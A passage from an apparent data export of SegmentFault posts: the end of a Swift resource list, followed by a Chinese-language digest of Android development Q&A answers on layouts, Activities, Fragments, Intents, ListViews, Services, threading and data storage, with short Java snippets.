<li><p><a href=""http://segmentfault.com/a/1190000002464158"" rel=""nofollow noreferrer"">《Swift：Generators 与 Sequences 浅析》</a> by Cruise_Chan</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002437363"" rel=""nofollow noreferrer"">《基本的图算法：Swift 实现》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000004023852"" rel=""nofollow noreferrer"">《Swift 中枚举高级用法及实践》</a> by SwiftGG翻译组</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000004035357"" rel=""nofollow noreferrer"">《Swift 反射 API 及用法》</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002479108"" rel=""nofollow noreferrer"">《Swift35/90Days - iOS 中的设计模式 (Swift 版本) 01》</a> by callmewhy</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000002571253"" rel=""nofollow noreferrer"">《Swift37/90Days - iOS 中的设计模式 (Swift 版本) 02》</a></p></li>
</ul>
<h3>优质专栏</h3>
<ul>
<li><p><a href=""http://segmentfault.com/blog/swiftgg"" rel=""nofollow noreferrer"">SwiftGG翻译组</a>：授权翻译国外 Swift 大牛的优秀 Swift 文章，绝对走心，绝对一手</p></li>
<li><p><a href=""http://segmentfault.com/blog/callmewhy"" rel=""nofollow noreferrer"">汪海的实验室</a>：Swift 90 Days</p></li>
<li><p><a href=""http://segmentfault.com/blog/devtalking"" rel=""nofollow noreferrer"">DevTalking</a>：细心的 Swift 学习</p></li>
<li><p><a href=""http://segmentfault.com/blog/cruise"" rel=""nofollow noreferrer"">青楼烟雨</a>：深度 iOS 学习指南</p></li>
</ul>
<h3>系列</h3>
<ul>
<li><p><a href=""http://segmentfault.com/blog/callmewhy"" rel=""nofollow noreferrer"">Swift 90 Days</a> by callmewhy</p></li>
<li><p><a href=""http://segmentfault.com/blog/johnlui"" rel=""nofollow noreferrer"">Auto Layout 使用心得</a> by JohnLui</p></li>
<li><p><a href=""http://segmentfault.com/a/1190000003051208"" rel=""nofollow noreferrer"">Swift + SpriteKit 中文教程</a> by 狂野之心</p></li>
</ul>
<h3>推荐</h3>
<ul>
<li>
<p>图灵访谈：</p>
<ul>
<li><p><a href=""http://segmentfault.com/a/1190000003849401"" rel=""nofollow noreferrer"">《Swift 与 Cocoa 框架开发》作者 Paris Buttfield-Addison：你的编程生涯可以从 Swift 开始！</a></p></li>
<li><p><a href=""http://segmentfault.com/a/1190000004010666"" rel=""nofollow noreferrer"">Swift 开发者大会组织者梁杰：你的到来是一个重要的决定</a></p></li>
</ul>
</li>
<li>
<p>重要活动：</p>
<ul>
<li><p><a href=""http://segmentfault.com/e/1160000003800674"" rel=""nofollow noreferrer"">中国首届 Swift 开发者大会</a></p></li>
<li><p><a href=""http://segmentfault.com/e/1160000004005032"" rel=""nofollow noreferrer"">SegmentFault D-Day 2015 北京：iOS 站</a></p></li>
</ul>
</li>
</ul>

                ", Apple 正式开源 Swift 语言及其核心库和包管理器,1531972078,517,1,836,1,1,https://segmentfault.com/a/1190000004095368
131,1,0,6,"
                    
<h2>Android</h2>
<h3>资源Resource与布局Layout</h3>
<h5><a href=""http://segmentfault.com/q/1010000003905460/a-1020000003905965"" rel=""nofollow noreferrer"">android:怎么实现一个控件与另一个指定控件左对齐</a></h5>
<p>针对你这种情况，最简单的一种办法是，设置两个TextView的宽度为固定值，且相等。<br><code>LinearLayout</code>是一种线性排列的布局，布局中的控件从左到右（或者是从上到下）依次排列。<code>wrap_content</code>依据其内容分配宽度，“用户名”和“密码”由于内容长度不同，导致对应的两个TextView不等宽，而其后紧跟EditText，这就导致了不对齐。<br>第2种方法，把LinearLayout中的组件宽度设置为0dp，然后设置其<code>android:layout_weight</code>，比如TextView设置为0.2，EditText设置为0.8，这两个控件就会按比例分配整个LinearLayout的宽度。第二个LinearLayout也同样设置，就可以保证EditText对齐。<br>第3种方法，使用<code>RelativeLayout</code>，通过<code>android:layout_alignLeft=""@id/anotherViewId""</code>设置该View的左边和指定View的左边对齐。</p>
<h5><a href=""http://segmentfault.com/q/1010000004040890/a-1020000004041110"" rel=""nofollow noreferrer"">Android 布局中 FrameLayout 的作用和 android:layout_weight 属性的工作原理</a></h5>
<p>通过代码动态添加的Fragment，需要在布局文件中为 Fragment 添加一个FrameLayout容器，以安排 Fragment 在 activity 视图中的位置。<br>在FrameLayout视图的子组件中，<code>layout_weight</code>属性无效。需要通过 <code>layout_gravity</code> 属性值决定子组件在 FrameLayout 视图中的位置。<br>对于水平方向的 LinearLayout，查看 layou_width 和 layout_weight 以决定子组件的宽度。</p>
<h5><a href=""http://segmentfault.com/q/1010000004032766/a-1020000004034499"" rel=""nofollow noreferrer"">如何通过代码设置TextView的Margin参数？</a></h5>
<p>如果父视图是LinearLayout，那么就可以直接调用textView.setLayoutParams(params)，然后在添加textView到LinearLayout。<br>如果父视图是RelativeLayout 或者 FrameLayout，上面的做法无效，解决的办法是新建一个LinearLayout，然后把textView添加给它，再把这个LinearLayout添加给父视图。</p>
<h5><a href=""http://segmentfault.com/q/1010000004013837/a-1020000004014348"" rel=""nofollow noreferrer"">ListView根据KeyBoard弹出、隐藏而自动滚动</a></h5>
<p>除了配置当前的Activity <code>android:windowSoftInputMode=""stateVisible|adjustResize""</code>外，还需要：<br><code>listView.setTranscriptMode(ListView.TRANSCRIPT_MODE_NORMAL);</code></p>
<h5><a href=""http://segmentfault.com/q/1010000003983065/a-1020000003983108"" rel=""nofollow noreferrer"">Android Studio引入图片时报错：Rendering Problems Couldn't resolve resource @mipmap/img1 Failed to convert @mipmap/img1 into a drawable</a></h5>
<p>在 <code>mipmap-[density]</code> 路径中放app icon图片，仍然在 <code>drawable-[density]</code> 中放其它图片。<br>因此，在Manifest中引用app icon时 <code>android:icon=""@mipmap/ic_launcher""</code>，在其它需要引用图片的地方仍然用 <code>@drawable/img1</code>.</p>
<h5><a href=""http://segmentfault.com/q/1010000003857938/a-1020000003975175"" rel=""nofollow noreferrer"">如何解决Android Resources$NotFoundException: Resource ID？</a></h5>
<p>一定是在调用类似如下API的地方，应该赋予的是资源ID，而你却直接给了一个整数，错的<code>View.setText(21)</code>，对的<code>View.setText(R.string.search);</code></p>
<h5><a href=""http://segmentfault.com/q/1010000003887701/a-1020000003887739"" rel=""nofollow noreferrer"">android ImageView 悬浮文字是怎么实现？</a></h5>
<p>实现方式应该是<code>FrameLayout</code>, 包含一个占满全部layout的ImageView，一个底部的TextView，一个右上角的用于显示数字的某种view。</p>
<h3>Activity</h3>
<h5><a href=""http://segmentfault.com/q/1010000003878021/a-1020000003899104"" rel=""nofollow noreferrer"">如何获取一个Android App APK的所有Activity类名，并通过代码启动其中某个Activity？</a></h5>
<p>通过一个App: Development.apk 获取一个Android App APK的所有Activity类名。它是默认安装在Android模拟器里的app，目的是方便测试和debug，其中一个功能叫<code>Package Browser</code>，可以看到App内的所有的activity.</p>
<h5><a href=""http://segmentfault.com/q/1010000003749035/a-1020000003898581"" rel=""nofollow noreferrer"">通过startActivity启动第三方应用的Activity时崩溃Permission Denial（比如打开微信朋友圈）</a></h5>
<p>只有当Activity向外声明了自己是可以处理某些 intent action 时，第三方 app 才能通过 intent 去启动它，否则将导致崩溃。通过配置文件中的intent过滤器来声明。<br>当知道了package name和class name，可以这样去启动第三方的activity:<br><code>intent.setComponent(new ComponentName(pkg, cls))</code></p>
<h5><a href=""http://segmentfault.com/q/1010000003888865/a-1020000003889167"" rel=""nofollow noreferrer"">调用系统相机后如何把照片直接传递给一个新的activity？</a></h5>
<p>这应该是不可能的，除非你有系统相机的源码，修改源码，然后在系统相机内直接启动你想启动的activity。可是为什么想要这样<strong>直接传递到新的activity</strong>呢？这多么费力不讨好啊。<br>不论是通过显示的还是隐式的intent，启动第三方的activity，应该总要返回到自己的activity，在<code>onActivityResult()</code>中处理返回的数据和结果。<br>所以我猜，你想实现的那种“直接”的效果，应该是在<code>onActivityResult</code>中拿到图片后，再次启动了另一个新的activity。<br>我做了一个测试：在A中启动B；B返回后，在A的onActivityResult中启动C。<strong>视觉上，B直接跳到了C。</strong></p>
<h5><a href=""http://segmentfault.com/q/1010000003807732/a-1020000003984641"" rel=""nofollow noreferrer"">安卓切屏重新调用activity生命周期方法有无必要？</a></h5>
<p>在manifest中配置activity的属性 <code>android:configChanges=""keyboardHidden|orientation|screenSize""</code> 后，就允许Activity自己处理屏幕方向的变化，避免了被系统销毁。也就是说，相应的生命周期方法不会被调到。</p>
<h5><a href=""http://segmentfault.com/q/1010000002539102/a-1020000003970444"" rel=""nofollow noreferrer"">点击ActionBar的放大镜图标以启动一个包含SearchView的Activity</a></h5>
<ol>
<li><p>首先配置这个新的Activity为<strong>可搜索的Activity</strong>，并实现其相应的方法；参考 <a href=""https://github.com/li2/Learning_Android_Programming/commit/9f9a899e93efc35cd5190e1f6c9f2f77a6bf6a19"" rel=""nofollow noreferrer"">链接1</a>；<a href=""https://github.com/li2/Learning_Android_Programming/commit/9f9a899e93efc35cd5190e1f6c9f2f77a6bf6a19"" rel=""nofollow noreferrer"">链接2</a>。</p></li>
<li><p>然后为某一个Activity添加MenuItem，在Item的点击事件中启动上面配置的activity；</p></li>
<li><p>同时要注意，需要调用<code>searchView.setIconifiedByDefault(false)</code>，这样启动的这个可搜索的activity的searchView才是展开的。</p></li>
</ol>
<h5><a href=""http://segmentfault.com/q/1010000003871478/a-1020000003885497"" rel=""nofollow noreferrer"">为什么SearchView提交搜索后onNewIntent()没被调用到？</a></h5>
<p>根据API说明，你的问题的关键在于<code>onQueryTextSubmit()</code>的返回值：只有返回false，才能使SearchView发起一个intent。如果返回true，就认为这个submit已经被listener自己处理掉了。修改返回值为fasle，解决问题。</p>
<h5><a href=""http://segmentfault.com/q/1010000003969510/a-1020000003969689"" rel=""nofollow noreferrer"">如何更改ActionBar上的SearchView图标？</a></h5>
<blockquote><p>Unfortunately, there is no easy way to change the SearchView icon to a custom drawable, since the theme attribute searchViewSearchIcon is not public. See this answer for details.</p></blockquote>
<h5><a href=""http://segmentfault.com/q/1010000003967799/a-1020000003967988"" rel=""nofollow noreferrer"">如何实现Android透明导航栏（Translucent Navigation Bar）？</a></h5>
<h5><a href=""http://segmentfault.com/q/1010000003890699/a-1020000003891174"" rel=""nofollow noreferrer"">如何调整Android ActionBar向上按钮(Up button)与屏幕左侧的距离？</a></h5>
<p>为action bar提供了自定义的布局，放弃使用android提供的Home键<code>android.R.id.home</code>作为UpIndicator。而是在这个布局中添加一个ImageView，这样就可以自定义你需要的间距离。然后实现<code>ImageView.OnClickListener</code>，点击时返回父activity。</p>
<h3>Fragment与ViewPager</h3>
<h5><a href=""http://segmentfault.com/q/1010000003947967/a-1020000003948441"" rel=""nofollow noreferrer"">Fragment切换时重叠</a></h5>
<p>我目前就测试到这两种情况会导致重叠：<br>可能1.通过代码或者布局文件，向同一个位置添加了2次Fragment；</p>
<h5><a href=""http://segmentfault.com/q/1010000003978225/a-1020000003978395"" rel=""nofollow noreferrer"">当Android旋转屏幕导致横竖屏切换时，如何保存当前Fragment的实例并在Activity销毁重建后还原状态？</a></h5>
<ul>
<li><p>设备旋转时保存Activity的交互状态: <code>onSaveInstanceState()</code>;</p></li>
<li><p>设备旋转时保存Fragment的交互状态: <code>setRetainInstance(true)</code>;</p></li>
<li><p>设备旋转时保存WebView的数据: <code>android:configChanges=""keyboardHidden|orientation|screenSize""</code>;</p></li>
<li><p>设备旋转时保存在自定义View中绘制的图形。</p></li>
</ul>
<h5><a href=""http://segmentfault.com/q/1010000003967198/a-1020000003967414"" rel=""nofollow noreferrer"">(Fragment) page.getCls().newInstance()是什么意思？</a></h5>
<p>SimpleBackPage是enum类型，意图是<strong>通过数字获取对应的Fragment类</strong>：</p>
<pre><code class=""java"">SimpleBackPage page = SimpleBackPage.getPageValue(pageValue);
// 如果pageValue=1，getCls返回的就是FeedBackFragment.class
// 如果pageVaule=2，getCls返回的就是AboutFrament.class
page.getCls();

public enum SimpleBackPage {
    FEEDBACK(1, R.string.setting_about, FeedBackFragment.class),
    ABOUT(2, R.string.setting_about, AboutFrament.class);
    
    private SimpleBackPage(int values, int title, Class&lt;?&gt; cls) {
        this.values = values;
        this.title = title;
        this.cls = cls;
    }
    public Class&lt;?&gt; getCls() {
        return cls;
    }    </code></pre>
<p>当拿到Fragment类后，<code>Fragment.class.newInstance()</code> 通过调用该类的无参数构造器，创建并返回该类的一个实例，等价于：<code>new Fragment()</code>。</p>
<h5><a href=""http://segmentfault.com/q/1010000003901495/a-1020000003901719"" rel=""nofollow noreferrer"">viewpager onPageSelected没有执行</a></h5>
<p><code>this.viewPager.setOnPageChangeListener(this);</code><br>追问：“首次进入界面时,显示第一个页面时相应的按钮颜色已经变成点击后的状态？”。<br>追答：首次进入界面时onPageSelected不会被调到。可以通过viewPager.setCurrentItem(0) 触发它。</p>
<h5><a href=""http://segmentfault.com/q/1010000003880819/a-1020000003880863"" rel=""nofollow noreferrer"">PagerAdapter.notifyDataSetChanged时崩溃：Activity has been destroyed</a></h5>
<p><code>Fragment</code>是attach在<code>Activity</code>上的，crash的原因显然是你在尝试调用<code>notifyDataSetChanged</code>更新fragment时，该fragment的attached activity已经被销毁了：“IllegalStateException: Activity has been destroyed”。一个workaround是这样的：</p>
<pre><code class=""java"">// here you check the value of getActivity() and break up if needed
if(getActivity() == null) {
    return;
}
// do your stuff to update fragment
// ...</code></pre>
<h5><a href=""http://segmentfault.com/q/1010000003731705/a-1020000003738254"" rel=""nofollow noreferrer"">ViewPager的Fragment中嵌套的Fragment怎么实现刷新数据?</a></h5>
<p>我按照你的流程写了一个demo，复现了你描述的bug现象。<br>当滑动ViewPager时，导致父fragment视图被销毁，即<code>onDestroyView()</code>被调到，<br>再次滑动到该父fragment时，重建视图，即<code>onCreateView()</code>被调到，<code>ft.add()</code>被再次调到，再次添加2个子fragment，这就导致了你提到的问题，而并非是<code>ft.hide()</code>不起作用。<br>一个变通的方法可以解决这个问题，在commit之前先remove所有的子Fragment：</p>
<h5><a href=""http://segmentfault.com/q/1010000003719990/a-1020000003723522"" rel=""nofollow noreferrer"">放入ViewPager的Fragment会因为Activity发生重新启动也跟着Activity重新创建吗？</a></h5>
<p>你的问题应该从生命周期和ViewPager的adapter来理解。<br>Fragment具有和Activity相似的生命周期，并且<strong>其生命周期方法由托管它的Activity调用。</strong><br>当把一些Fragment放入ViewPager时，就需要adapter的支持，以管理这些Fragment。对于常用的两种adapter，FragmentStatePagerAdapter会销毁掉不需要的fragment，而FragmentPagerAdapter只是销毁了fragment的视图。</p>
<h5><a href=""http://segmentfault.com/q/1010000003883964/a-1020000003884103"" rel=""nofollow noreferrer"">如何在屏幕底部显示DialogFragment对话框，并且与屏幕等宽？</a></h5>
<pre><code class=""java"">public class DatePickerDialog extends DialogFragment {
  @Override
  public Dialog onCreateDialog(Bundle savedInstanceState) {
    // 使用不带theme的构造器，获得的dialog边框距离屏幕仍有几毫米的缝隙。
    // Dialog dialog = new Dialog(getActivity());
    Dialog dialog = new Dialog(getActivity(), R.style.CustomDatePickerDialog);
    // must be called before set content    
    dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
    dialog.setContentView(R.layout.dialog_datepicker);
    
    // 设置宽度为屏宽、靠近屏幕底部。
    Window window = dialog.getWindow();
    WindowManager.LayoutParams wlp = window.getAttributes();
    wlp.gravity = Gravity.BOTTOM;
    wlp.width = WindowManager.LayoutParams.MATCH_PARENT;
    window.setAttributes(wlp);
 
    return dialog;
  }</code></pre>
<h3>Intent</h3>
<h5><a href=""http://segmentfault.com/q/1010000002563862/a-1020000003928253"" rel=""nofollow noreferrer"">PendingIntent和Intent传递数据有区别吗？</a></h5>
<p><code>PendingIntent.getActivity(...)</code> 和 <code>startActivity(intent)</code> 两种方式启动的Activity都以同样的方法获取extra数据：<br><code>PendingIntent.getActivity()</code>打包了一个<code>Context.startActivity()</code>方法的调用，该方法告诉操作系统『我需要启动一个Activity』，随后调用<code>PendingIntent.send()</code>方法时，操作系统会按照我们的要求发送原来封装的intent。<br>但是使用PendingIntent需要特别注意：</p>
<ol>
<li><p>获取的extra数据很可能是旧的：除非把第4个参数从0改成<code>PendingIntent.FLAG_UPDATE_CURRENT</code>.</p></li>
<li><p>为了安全因素，最好只发送显示的intent.</p></li>
</ol>
<p><code>PendingIntent.getActivity(...)</code> 和 <code>startActivityForResult(...)</code> 两种方式（第2个参数都是requestCode）启动的Activity以同样的方法返回result：<code>setResult(resultCode, intent)</code>。<br>然后在<code>void onActivityResult(int requestCode, int resultCode, Intent data)</code>中根据<code>resultCode</code>做相应的处理。</p>
<p>总结：还是让<code>PendingIntent</code>做它“字面上”该做的事情为好，比如通过AlarmManager定时做的任务，通过NotificationManager发送消息到通知栏，一种pending状态。让<code>startActivity</code>启动应用内的Activity，启动其它应用：读取联系人、调用摄像头、发送社交圈，等等，需要立刻响应的任务。</p>
<h3>ListView与ExpandableListView</h3>
<h5><a href=""http://segmentfault.com/q/1010000003972290/a-1020000003973789"" rel=""nofollow noreferrer"">如何删除Android ExpandableListView中某个group item的child item？</a></h5>
<p>要正确定义数据，以及初始化adapter的数据。这样定义数据是不可取的：</p>
<pre><code class=""java"">rivate String [] groupStr={""第一组"",""第二组"",""第三组""};
private String [] childStr={""first"",""second"",""third""};
private List&lt;Map&lt;String, String&gt;&gt; groupData = new ArrayList&lt;Map&lt;String, String&gt;&gt;();
private List&lt;Map&lt;String, String&gt;&gt; childData = new ArrayList&lt;Map&lt;String, String&gt;&gt;();</code></pre>
<p>如果删除了child index=2元素，必然导致你的childData和groupData数量不对等，当adapter试图为group2调用<code>getChildrenCount(int groupPosition)</code>时崩溃。<br>应该像这样定义child data: <code>List&lt;List&lt;Map&lt;String, ?&gt;&gt;&gt;</code>.</p>
<h5><a href=""http://segmentfault.com/q/1010000003909527/a-1020000003910783"" rel=""nofollow noreferrer"">删除ExpandableListView的child item时报错ClassCastException: Activity cannot be cast to OnClickListener</a></h5>
<p>原因是你传入的context，也就是<code>SumFileActivity</code>，并没有实现你定义的<code>IOnClickListener</code>。所以无法强制转型。既然你在Fragment中实现了接口，那我们可以这样做，注册一个接口，替代传入context的办法，然后还需要做的事件就是，在创建MyDialog的Fragment里面调用<code>setOnClickListener</code>.</p>
<h5><a href=""http://segmentfault.com/q/1010000003902645/a-1020000003903355"" rel=""nofollow noreferrer"">ExpandableListView中自定义的child item无法点击</a></h5>
<p>虽然设置了<code>setOnChildClickListener()</code>，但点击child list view item无反应，就我刚才测试来看，有两种情况：<br>第1种情况，<code>isChildSelectable()</code>返回<code>false</code>，已经被你排除了。<br>第2种情况，item的布局文件中，有控件劫持了点击事件（<code>ListView</code>都存在这种情况）<code>android:focusable=""true""</code>。不配置TextView的这个属性（因为TextView默认是非聚焦的），或者设置为false，就能让item能响应点击事件。<br>而像CheckBox, Button, EditText等默认是可聚焦的，如果包含在list item layout内，而且还需要响应item的点击事件的话，那么必须设置为非聚焦。</p>
<h5><a href=""http://segmentfault.com/q/1010000003953634/a-1020000003954043"" rel=""nofollow noreferrer"">ExpandableListAdapter中getChild和getGroup调用时间？</a></h5>
<p>关于getChildrenCount：<br>点击展开GroupItem时，<code>getChildrenCount()</code>被调到，以返回这个Group的child数量（为避免出现数组越界的错误）；然后adapter才会去调用<code>getChildView()</code>。</p>
<p>关于getChildView()、getChild()、getGroup()：<br>我们需要覆写<code>getChildView()</code>，以填充视图，那么首先要拿到数据，而<code>getChild()</code>的目的就是拿到存储在adapter中对应位置的数据。当然，如果你在adapter之外维护了一个child data list，也可以直接从这个list中取数据。但是<code>getChild()</code>看起来不是更清楚明了吗？<br><code>getGroup()</code>也是同样的道理，在执行<code>getGroupView()</code>填充group视图时，让你可以轻松地获取对应的数据。</p>
<p>本质上，ExpandableListAdapter 的<code>getChild(), getGroup()</code> 和 android.widget.Adapter 的 <code>Object getItem(int position)</code> 是一回事儿：『Get the data item associated with the specified position in the data set.』</p>
<h5><a href=""http://segmentfault.com/q/1010000003870722/a-1020000003870759"" rel=""nofollow noreferrer"">如何理解BaseAdapter.getVeiw()参数convertView的null与非null</a></h5>
<p>简单来说，是为了<strong>复用，避免每次从layout资源文件生成新的视图（或者是通过代码生成新的视图）</strong>。比如像<code>ListView</code>或者<code>GridView</code>，屏幕上若能显N个条目，那么<code>getView</code>就被调用N次，以提供对应位置的视图。而复用之前已经生成的视图，可以提高效率。</p>
<h5><a href=""http://segmentfault.com/q/1010000002979042/a-1020000003862755"" rel=""nofollow noreferrer"">长按Fragment List Item无法弹出上下文菜单context menu</a></h5>
<p>你的代码已经成功地添加了context menu, 之所以长按无反应，原因很可能是list item有组件截获了list的点击事件。检查list item的布局文件，应该可以看到<code>android:focusable=""true""</code>。把它设置为false.</p>
<h5><a href=""http://segmentfault.com/q/1010000003835627/a-1020000003836000"" rel=""nofollow noreferrer"">使用默认的ArrayAdapter构建ListView时抛出异常NullPointerException</a></h5>
<p>错误提示信息告诉你问题出在这：『at android.widget.ArrayAdapter.getView(ArrayAdapter.java:369』<br>你需要了解默认的getView方法的实现：<br>在adapter的构造方法中指定的布局(android.R.layout.simple_list_item_1)是Android SDK 提供的预定义布局资源。该布局拥有一个TextView根元素。而默认的ArrayAdapter&lt;T&gt;.getView(...)实现方法依赖于toString()方法。它首先生成布局视图，然后找到指定位置的对象并对其调用toString()方法，最后得到字符串信息并传递给TextView。<br>所以，我猜问题应该是你传给Adapter的dataList包含null对象。你应该着重检查更改adapter数据的代码。</p>
<h3>Service</h3>
<h5><a href=""http://segmentfault.com/q/1010000004001588/a-1020000004005912"" rel=""nofollow noreferrer"">Android后台下载问题</a></h5>
<p>通过bound service实现后台下载，这样，显示下载状态的UI组件被销毁再重建时，通过绑定service就可以正确显示下载状态。当然下载任务必须交给工作线程（比如AsyncTask），由bound service启动AsyncTask，通过广播或者接口的方式，应用组件就可以获取下载状态。</p>
<h5><a href=""http://segmentfault.com/q/1010000003937375/a-1020000003937397"" rel=""nofollow noreferrer"">如何根据数据库是否有新内容来给手机发送一条push?</a></h5>
<p>针对Android，如果App不在前台的话，可以通过service完成：</p>
<ul>
<li><p>使用IntentService在后台抓取服务器的最新数据；</p></li>
<li><p>使用AlarmManager和PendingIntent安排服务的运行（设置service查询的间隔时间）；</p></li>
<li><p>使用Notification从后台通知用户（用户下拉通知栏后可以看到详细信息，点击后进入App）。</p></li>
</ul>
<h3>Broadcast与Receiver与Notification</h3>
<h5><a href=""http://segmentfault.com/q/1010000004029184/a-1020000004034635"" rel=""nofollow noreferrer"">为何Android中大部分锁屏APP都要手动勾选“通知使用权”(Notification Access)？</a></h5>
<p>从官方文档看，应该是为了获得其他APP的通知内容从而在自己的锁屏界面上显示。you can designate whether a notification from your app is visible on the lock screen.</p>
<h5><a href=""http://segmentfault.com/q/1010000004012291/a-1020000004013049"" rel=""nofollow noreferrer"">如何不在状态栏显示notification的ticker view，仅在状态栏的下拉抽屉中显示notification的content view？</a></h5>
<p>在4.2的机器上测试，无法做到。</p>
<h5><a href=""http://segmentfault.com/q/1010000003915994/a-1020000003916834"" rel=""nofollow noreferrer"">application 进程被系统杀死后，为何不能接受broadcast？</a></h5>
<h3>Thread</h3>
<h5><a href=""http://segmentfault.com/q/1010000003961853/a-1020000003962008"" rel=""nofollow noreferrer"">假如主线程依赖子线程A的执行结果，如何让A执行完成之后主线程再往下执行呢？</a></h5>
<p>需要在子线程执行完成的地方，通过主线程的Handler发送一条消息；主线程收到消息后执行。<br>主线程是UI线程，不要试图让UI线程等待某个结果，之后再往下执行，这会导致UI卡顿。UI线程是一直循环的，我们需要通过消息机制通知UI线程去做一些事情。</p>
<h5><a href=""http://segmentfault.com/q/1010000003030312/a-1020000003952606"" rel=""nofollow noreferrer"">关于线程上的问题</a></h5>
<p>你既然想在主线程之外执行<code>recorder.start()</code>，所以<strong>关键在于你代码中的mhandler是谁创建的？</strong> 如果是在UI线程中创建的，那么你通过<code>mhandler.sendMessage</code>或者<code>post(Runnable)</code>这些方式，相应的代码仍将在主线程中执行。</p>
<h3>View</h3>
<h5><a href=""http://segmentfault.com/q/1010000003945505/a-1020000003945637"" rel=""nofollow noreferrer"">如何处理 ScrollView 的点击事件？</a></h5>
<p>方法1：ScrollView內的子View消耗了它的点击事件，所以一个解决办法是，为它的子View设置<code>setOnClickListener</code>. (这种办法，我测试了可行）<br>方法2：设置所有子View的xml属性<code>android:clickable=""false""</code>, 然后实现ScrollView的<code>setOnClickListener</code>方法。（这种方法来自<a href=""http://stackoverflow.com/a/16776927/2722270"" rel=""nofollow noreferrer"">OnClickListener on scrollView</a>，我测试了不行，但解决了别人的问题）</p>
<h5><a href=""http://segmentfault.com/q/1010000003944754/a-1020000003944788"" rel=""nofollow noreferrer"">怎么判断一个图片数组里面的id被点击事件？</a></h5>
<p>为数组里的每一个图片设置一个tag：<code>ImageView.setTag(Objcet tag)</code>，<br>在onClick中通过tag识别图片：<code>((ImageView)v).getTag()</code></p>
<h5><a href=""http://segmentfault.com/q/1010000003937809/a-1020000003938555"" rel=""nofollow noreferrer"">SlidingMenu拖拽出来是白板，怎么办？</a></h5>
<p><code>R.layout.menu_frame</code>包含一个<code>FrameLayout</code>，这只是一个空的布局，你可以把它当做一个Fragment的容器。SlidingMenu提前注册了一个空的布局，需要你用自己的menu去替换它：<br><code>.replace(R.id.menu_frame, new SampleListFragment())</code><br>你并没有替换，所以看到的是空的。这种做法的本质是把一个包含menu的Fragment视图添加给Activity。</p>
<h5><a href=""http://segmentfault.com/q/1010000003925031/a-1020000003925773"" rel=""nofollow noreferrer"">点击button弹出单选框，选择其中一个值，并显示在button上</a></h5>
<pre><code class=""java"">AlertDialog.Builder builder = new AlertDialog.Builder(this);
builder.setSingleChoiceItems(R.array.test, 0, new OnClickListener() {
    @Override
    public void onClick(DialogInterface dialog, int which) {
        ListView lw = ((AlertDialog) dialog).getListView();
        // which表示点击的条目
        Object checkedItem = lw.getAdapter().getItem(which);
        // 既然你没有cancel或者ok按钮，所以需要在点击item后使dialog消失
        dialog.dismiss();
        // 更新你的view
        mButton.setText((String)checkedItem);
    }
});

AlertDialog dialog = builder.create();
dialog.show();</code></pre>
<h5><a href=""http://segmentfault.com/q/1010000003890144/a-1020000003890302"" rel=""nofollow noreferrer"">TextView 如何设置半透明背景色？</a></h5>
<p><code>android:alpha=""0.5""</code></p>
<blockquote><p>alpha property of the view, as a value between 0 (completely transparent) and 1 (completely opaque). Related Methods: <code>setAlpha(float)</code></p></blockquote>
<h5><a href=""http://segmentfault.com/q/1010000003794567/a-1020000003889360"" rel=""nofollow noreferrer"">对于一个单行TextView，当字符串超出一行时，如何获取未显示的部分字符串？</a></h5>
<p>如果你想得到已显示的字符个数，或者未显示的字符个数，那么其中的关键是如何计算每一个字符的宽度。然后遍历这个字符串，当前n个字符宽度总和，超过TextView宽度时，就得到了已显示的字符个数。</p>
<h5><a href=""http://segmentfault.com/q/1010000003881268/a-1020000003881616"" rel=""nofollow noreferrer"">如何修改WebView文本选中时的Contextual Action Bar为Floating Context Menu？</a></h5>
<h3>数据存储</h3>
<h5><a href=""http://segmentfault.com/q/1010000003958546/a-1020000003959107"" rel=""nofollow noreferrer"">Android开发中sqlite的使用广泛吗？</a></h5>
<ul>
<li><p>如果需要<strong>存储用户配置</strong>，比如某些选项是允许还是禁止，或者是搜索框的历史记录，可以使用 <strong>shared preferences</strong>，它是一种存储key-value的xml文件，可以实现轻量级数据的永久存储，使用SharedPreferences类读写。</p></li>
<li><p>如果需要<strong>存储少量的、简单的数据</strong>，可以使用<strong>Json</strong>文件。</p></li>
<li><p>如果需要<strong>存储大量的、复杂的数据</strong>，比如一个跑步运动App，持续追踪用户的跑步路线，那就需要存储大量的地理位置数据。而<strong>SQLite</strong>是一个轻量级的开源跨平台库，并具有一套强大的关系型数据库API可供使用，数据在磁盘上单个文件的形式存在。Android为SQLite提供了很多类，可以很方便的完成对数据库的读写操作。</p></li>
</ul>
<h5><a href=""http://segmentfault.com/q/1010000004023270/a-1020000004035066"" rel=""nofollow noreferrer"">如何理解Android ContentResolver.query(...) 参数为null时的作用？</a></h5>
<p>对API存疑的时候，最快的方式是查看API文档：Passing null will return all columns / all rows for the given URI.</p>
<h5><a href=""http://segmentfault.com/q/1010000003750099/a-1020000003750597"" rel=""nofollow noreferrer"">如何解析Json文件？</a></h5>
<p>我们把json文件重新排列，目的是为了呈现其清晰的嵌套结构。因此，可以注意到，json包含这些元素：<br>由<code>[]</code>括起来的称之为数组<code>JSONArray</code>;<br>由<code>{}</code>括起来的称之为<code>JSONObject</code>;<br>字符串<code>String</code>；<br><code>boolean, double, int, long</code> 基本数据类型；</p>
<p>通过JSON Object的方法获取这些数据，比如string：<code>JSONObject.getString(String name)</code><br>然后根据JSON文件的结构，一层一层地解析。</p>
<h3>Java</h3>
<h5><a href=""http://segmentfault.com/q/1010000003775109/a-1020000003894563"" rel=""nofollow noreferrer"">什么是回调函数？一个类中的回调函数是什么作用？</a></h5>
<p>发现你最近也有提Android相关的问题，那我就通过Android ListView item的点击事件，一种使用频率很高的view，通过它认识“回调”，可能有助于理解。<br>比如ListView包含几个概略信息条目，你想点击某个条目跳到详情界面。</p>
<p><code>mListView.setOnItemClickListener(new OnItemClickListener() { ... });</code><br>就已经实现了一个回调（implements a callback interface）。<br>接下来发生的事情我们就知道了，点某个条目就跳到其详情界面。<br>问题是，谁去调(call)它呢？我们在实现(implements)这个回调时，为什么必须要override其中的方法呢？</p>
<p>// 当view被点到时，performItemClick就被调到，处理点击带给view的变化，除此之外，<br>// AdapterView还想到了，“如果其它类想在点击发生时做点儿事情，该怎么办呢？”<br>// 通过接口。<br>// (1)我来定义接口，把知道的信息（被点到的view、position、id）告诉你；<br>// (2)你来实现接口，然后把实现的接口告诉我。</p>
